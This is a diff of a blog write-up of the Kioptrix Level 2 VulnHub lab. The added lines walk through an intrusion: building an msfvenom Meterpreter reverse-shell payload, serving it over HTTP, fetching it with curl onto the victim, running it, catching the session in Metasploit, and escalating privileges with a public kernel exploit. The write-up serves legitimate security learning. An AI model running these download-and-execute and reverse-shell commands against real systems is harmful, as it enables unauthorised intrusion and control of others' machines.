@@ -6,6 +6,7 @@ categories: blog
 tags:   [hacking, Kioptrix]
 ---
 **[Disclaimer!][1]**
+Updated on July 31, 2020.
 
 ### Kioptrix Level Two
 Download: [VulnHub][2]  
@@ -146,10 +147,123 @@ read the 'passwd' file, couldn't read the shadow file, netcat isn't installed bu
 installed.
 
 From here I want to get a shell on the computer, so I am going to use to `msfvenom` to develop a 
-payload that will get me a remote shell.
+payload that will get me a remote shell. I can never remember all of the parameters and you might
+find you need to use different parameters depending on your specific situation, so I highly
+recommend the '--help' and '--list' parameters to help you get the hang of things. My command ended
+up looking like this:  
+```bash
+msfvenom --arch x86 \
+         --payload linux/x86/meterpreter_reverse_tcp \
+         LHOST=10.0.100.23 LPORT=443 \
+         --format elf \
+         --out linuxMeterpreterReverseShell
+```
 
-To be continued...
+This will give us our payload, and now all we have to do is deliver the payload to the destination.
+One of my favorite ways of delivering payloads using http is using Python's built in http server
+module. To do this in Python 3, you run the following: `python -m http.server 8080`, where 8080 is 
+the port your Python web server is going to listen on. If a port is not specified, port 8000 will
+be used. Please note that if you are going to be using a port below 1024, you must run the command
+as root, as these ports are reserved.
+```bash
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+One **very important** note on this method: This is going to open up the directory where
+you launch it to _everyone_. This is not a secure method of file transfer and this should be taken
+into consideration when you are on an actual engagement, as this will expose all files in that
+directory. This might not be of major concern, but it is something you should not forget.
+
+Now that I've got a server listening on port 8000, I need to deliver my payload. Going back to our
+admin page where we learned we can string commands together, we're now going to use the curl
+command to pull down our payload to the victim computer. Since we already know how the stringing
+together of commands works, I will just share the important commands to pull and execute our
+payload.
+```bash
+curl -X GET -O http://10.0.100.23:8000/linuxMeterpreterReverseShell
+
+# My Python web server logs:
+10.0.100.26 - - [31/Jul/2020 20:22:33] "GET /linuxMeterpreterReverseShell HTTP/1.1" 200 -
+----------------------------------------
+Exception happened during processing of request from ('10.0.100.26', 32769)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/http/server.py", line 647, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.8/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.8/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.8/http/server.py", line 654, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.8/http/server.py", line 853, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.8/shutil.py", line 205, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.8/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+```
+
+This is not the normal log message so my next command was to list the files in the directory, which
+showed that the file was not there and the directory was owned by root. This led me to believe that
+the error we received before was an error when trying to write the payload to disk, so my next
+plan is to put the payload somewhere I know it will be able to be written: /tmp. With that hurdle
+overcome, we can now set up our payload.
+```bash
+curl -X GET -o /tmp/revShell http://10.0.100.23:8000/linuxMeterpreterReverseShell
+chmod 755 /tmp/revShell
+/tmp/revShell
+
+# My meterpreter hander setup:
+msf5 > 
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > set payload linux/x86/meterpreter_reverse_tcp
+payload => linux/x86/meterpreter_reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 10.0.100.23
+LHOST => 10.0.100.23
+msf5 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.0.100.23:443
+
+# Upon execution of the final command from above: /tmp/revShell
+[*] Meterpreter session 1 opened (10.0.100.23:443 -> 10.0.100.26:32772) at 2020-07-31 20:31:23 -0400
+
+# And we are rewarded with the glorious site!!!!
+meterpreter >
+meterpreter > sysinfo
+Computer     : kioptrix.level2
+OS           : CentOS 4.5 (Linux 2.6.9-55.EL)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+```
+
+And now we move on to escalation of privileges...
+
+A quick check of the system showed us that this server is running Linux kernel 2.6.9, CentOS 4.5.
+This is a pretty old version of CentOS and a pretty old Linux kernel, and a quick check of the
+Exploit Database searching for 'linux 2.6.9 centos' gives us a few choices. My choice here was to
+try the 'ip_append_data()' privilege escalation method, which can be found [here][4].
+
+There are a few ways we can do this, so I first checked to see if gcc was installed on our victim
+computer. Once that was confirmed, I chose to create a new file and edit it in vi. I copied and
+pasted the code into vi and then saved the file. One quick compile later, and I have a functional
+exploit:
+![ROOOOOOOT!](/assets/images/kioptrix2-root.png)
+
+
 
 [1]: /disclaimer/
 [2]: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
 [3]: https://www.exploit-db.com/papers/14340
+[4]: https://www.exploit-db.com/exploits/9542
